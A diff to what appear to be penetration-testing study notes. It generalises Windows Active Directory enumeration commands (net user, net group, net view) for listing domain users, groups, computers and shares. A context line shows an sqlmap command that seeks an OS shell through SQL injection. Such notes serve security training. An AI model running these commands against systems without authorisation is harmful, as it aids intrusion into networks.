@@ -427,9 +427,20 @@ sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
 #### Traditional Approach
 
 ```
-C:\Users\Offsec.corp> net user /domain
-C:\Users\Offsec.corp> net user jeff_admin /domain
-C:\Users\Offsec.corp> net group /domain
+# get all users in the domain
+cmd> net user /domain
+cmd> net user [username] /domain
+
+# get all groups in the domain
+cmd> net group /domain
+cmd> net group [groupname] /domain
+
+# get all computers in domain
+cmd> net view
+cmd> net view /domain
+
+# get resources/shares of specified computer
+cmd> net view \\[computer_name] /domain
 ```
 
 #### A Modern Approach
